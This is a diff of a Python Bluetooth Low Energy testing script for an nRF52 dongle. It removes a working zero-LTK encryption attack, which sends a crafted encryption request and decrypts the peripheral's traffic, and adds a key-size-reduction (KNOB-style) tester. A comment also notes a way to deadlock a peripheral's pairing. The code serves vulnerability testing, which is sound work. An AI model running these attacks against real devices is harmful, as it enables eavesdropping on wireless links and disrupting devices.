@@ -2,19 +2,19 @@
 import os
 import platform
 import sys
-from binascii import hexlify
 from time import sleep
 
 # extra libs
-sys.path.insert(0, os.getcwd() + '/libs')
+sys.path.insert(0, os.getcwd() + '/')  # If the user runs this on previous path
+sys.path.insert(0, os.getcwd() + '/libs')  # If the user runs this on previous path
+sys.path.insert(0, os.getcwd() + '/../libs')
+sys.path.insert(0, os.getcwd() + '/../')
 import colorama
 from colorama import Fore
 from drivers.NRF52_dongle import NRF52Dongle
 from scapy.layers.bluetooth4LE import *
 from scapy.layers.bluetooth import *
-from scapy.utils import raw
 from timeout_lib import start_timeout, disable_timeout, update_timeout
-from Crypto.Cipher import AES
 
 # Default master address
 master_address = '5d:36:ac:90:0b:20'
@@ -34,12 +34,8 @@ SCAN_TIMEOUT = 2
 none_count = 0
 end_connection = False
 connecting = False
-conn_skd = None
-conn_iv = None
-conn_ltk = None
-conn_tx_packet_counter = 0
-conn_rx_packet_counter = 0
-encryption_enabled = False
+current_key_size = 6
+accepted_keys = []
 
 # Autoreset colors
 colorama.init(autoreset=True)
@@ -90,69 +86,17 @@ def set_security_settings(pkt):
     print(Fore.YELLOW + 'We are using authentication of ' + hex(paring_auth_request))
 
 
-def bt_crypto_e(key, plaintext):
-    aes = AES.new(key, AES.MODE_ECB)
-    return aes.encrypt(plaintext)
+def send_termination_indication():
+    pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_TERMINATE_IND()
+    driver.send(pkt)
 
 
-def send_encrypted(pkt):
-    global access_address, conn_tx_packet_counter
-    try:
-        raw_pkt = bytearray(raw(pkt))
-        access_address = raw_pkt[:4]
-        header = raw_pkt[4]  # Get ble header
-        length = raw_pkt[5] + 4  # add 4 bytes for the mic
-        crc = '\x00\x00\x00'  # Dummy CRC (Dongle automatically calculates it)
-
-        pkt_count = bytearray(struct.pack("<Q", conn_tx_packet_counter)[:5])  # convert only 5 bytes
-        pkt_count[4] |= 0x80  # Set for master -> slave
-        nonce = pkt_count + conn_iv
-
-        aes = AES.new(conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
-        aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD
-
-        enc_pkt, mic = aes.encrypt_and_digest(raw_pkt[6:-3])  # get payload and exclude 3 bytes of crc
-        conn_tx_packet_counter += 1  # Increment packet counter
-        driver.raw_send(access_address + chr(header) + chr(length) + enc_pkt + mic + crc)
-        print(Fore.CYAN + "TX ---> [Encrypted]{" + pkt.summary()[7:] + '}')
-    except Exception as e:
-        print(Fore.RED + "Encryption problem: " + e)
-
-
-def receive_encrypted(pkt):
-    global access_address, conn_rx_packet_counter
-    raw_pkt = bytearray(raw(pkt))
-    access_address = raw_pkt[:4]
-    header = raw_pkt[4]  # Get ble header
-    length = raw_pkt[5]  # add 4 bytes for the mic
-
-    if length is 0 or length < 5:
-        # ignore empty PDUs
-        return pkt
-    # Subtract packet length 4 bytes of MIC
-    length -= 4
-    # Update nonce before decrypting
-    pkt_count = bytearray(struct.pack("<Q", conn_rx_packet_counter)[:5])  # convert only 5 bytes
-    pkt_count[4] &= 0x7F  # Clear bit 7 for slave -> master
-    nonce = pkt_count + conn_iv
-
-    aes = AES.new(conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
-    aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD
-
-    dec_pkt = aes.decrypt(raw_pkt[6:-4 - 3])  # get payload and exclude 3 bytes of crc
-    conn_rx_packet_counter += 1
-    try:
-        mic = raw_pkt[6 + length: -3]  # Get mic from payload and exclude crc
-        aes.verify(mic)
-
-        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
-    except Exception as e:
-        print(Fore.RED + "MIC Wrong: " + e)
-        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
+def check_range(array, left, right):
+    return len([x for x in array if left <= x <= right]) > 0
 
 
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='zero_ltk_capture.pcap')
+driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='knob_ble_tester.pcap')
 # Send scan request
 scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
     ScanA=master_address,
@@ -168,11 +112,7 @@ while True:
     data = driver.raw_receive()
     if data:
         # Decode Bluetooth Low Energy Data
-        if encryption_enabled:
-            pkt = BTLE(data)
-            pkt = receive_encrypted(pkt)  # Decrypt Link Layer
-        else:
-            pkt = BTLE(data)  # Receive plain text Link Layer
+        pkt = BTLE(data)  # Receive plain text Link Layer
         # if packet is incorrectly decoded, you may not be using the dongle
         if pkt is None:
             none_count += 1
@@ -252,7 +192,7 @@ while True:
                 iocap=pairing_iocap,
                 oob=0,
                 authentication=paring_auth_request,
-                max_key_size=16,
+                max_key_size=current_key_size,
                 initiator_key_distribution=0x07,
                 responder_key_distribution=0x07)
             driver.send(pairing_req)
@@ -261,62 +201,46 @@ while True:
         elif SM_Pairing_Response in pkt:
             # Pairing request accepted
             # ediv and rand are 0 on first time pairing
-            conn_iv = '\x00' * 4  # set IVm (IV of master)
-            conn_skd = '\x00' * 8  # set SKDm (session key diversifier part of master)
-            enc_request = BTLE(
-                access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv='\x00',
-                                                                                   rand='\x00',
-                                                                                   skdm=conn_iv,
-                                                                                   ivm=conn_skd)
-            driver.send(enc_request)  # Send the malicious packet (2/2)
-
-        elif LL_ENC_RSP in pkt:
-            # Get IVs and SKDs from slave encryption response
-            conn_skd += pkt[LL_ENC_RSP].skds  # SKD = SKDm || SKDs
-            conn_iv += pkt[LL_ENC_RSP].ivs  # IV = IVm || IVs
-            conn_ltk = '\x00' * 16  # Link Layer Key (This is the key value for the attack)
-            conn_session_key = bt_crypto_e(conn_ltk[::-1], conn_skd[::-1])
-            conn_packet_counter = 0
-            print(Fore.GREEN + 'Received SKD: ' + hexlify(conn_skd))
-            print(Fore.GREEN + 'Received  IV: ' + hexlify(conn_iv))
-            print(Fore.GREEN + 'Assumed  LTK: ' + hexlify(conn_ltk))
-            print(Fore.GREEN + 'AES-CCM  Key: ' + hexlify(conn_session_key))
-
-
-        # Slave will send LL_ENC_RSP before the LL_START_ENC_RSP
-        elif LL_START_ENC_REQ in pkt:
-            print(Fore.YELLOW + 'Received encryption request start from peripheral during the pairing procedure!!!')
-            print(Fore.YELLOW + 'This means that the peripheral is using some unknown LTK here (informed by the SMP)')
-            # Encryption setup procedure accepted
-            # Disconnecting here (end_connection = True) causes peripheral to deadlock SMP to not perform
-            # further pairings Peripheral SMP gets back to normal after user restarts manually the device
-            # end_connection = True # (Uncomment here)
-            encryption_enabled = True
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
-            send_encrypted(pkt)
-
-        elif LL_START_ENC_RSP in pkt:
-            print(
-                    Fore.RED + 'Oooops, we were able to decrypt an encrypted response from the peripheral using a zero LTK\n'
-                               'Zero LTK vulnerability is present. Check the zero_ltk.pcpap file for more information')
             end_connection = True
-            driver.save_pcap()
-            exit(0)
+            print(Fore.YELLOW + 'Slave accepted key size of ' + str(current_key_size))
+            accepted_keys.append(current_key_size)
+            current_key_size += 1
+            send_termination_indication()
 
         elif LL_REJECT_IND in pkt or SM_Failed in pkt:
-            print(Fore.GREEN + 'Slave rejected attack. You are safe!')
+            print(Fore.GREEN + 'Slave rejected key size of ' + str(current_key_size))
+            current_key_size += 1
             end_connection = True
+            send_termination_indication()
 
-        elif end_connection == True:
+        if end_connection == True:
             end_connection = False
-            encryption_enabled = False
             scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                 ScanA=master_address,
                 AdvA=advertiser_address)
-            print(Fore.YELLOW + 'Connection reset, malformed packets were sent')
+            print(Fore.YELLOW + 'Connection reset')
 
             print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
             driver.send(scan_req)
             start_timeout('crash_timeout', 7, crash_timeout)
+
+        if current_key_size > 17:
+            print(Fore.MAGENTA + 'Key sizes accepted by peripheral: ' + str(accepted_keys))
+
+            if check_range(accepted_keys, 0, 6):
+                print(Fore.RED + 'Peripheral accepts key size lower than 7!!!')
+
+            elif check_range(accepted_keys, 7, 15):
+                print(Fore.RED + 'Peripheral allows key entropy reduction. The key size range is '
+                                 '[' + str(min(accepted_keys)) + ',' + str(max(accepted_keys)) + ']')
+            elif check_range(accepted_keys, 16, 17):
+                print(Fore.RED + 'Peripheral accepts key size greater than 16. Non-compliance!!!')
+            elif check_range(accepted_keys, 16, 16) and not check_range(accepted_keys, 7, 15):
+                print(Fore.GREEN + 'Peripheral only accepts key size of 16. We are good to go!!!')
+            else:
+                print(Fore.RED + 'Something went wrong during testing, check if the peripheral accepts pairing')
+
+            print(Fore.YELLOW + 'Test finished')
+            exit(0)
 
 sleep(0.01)
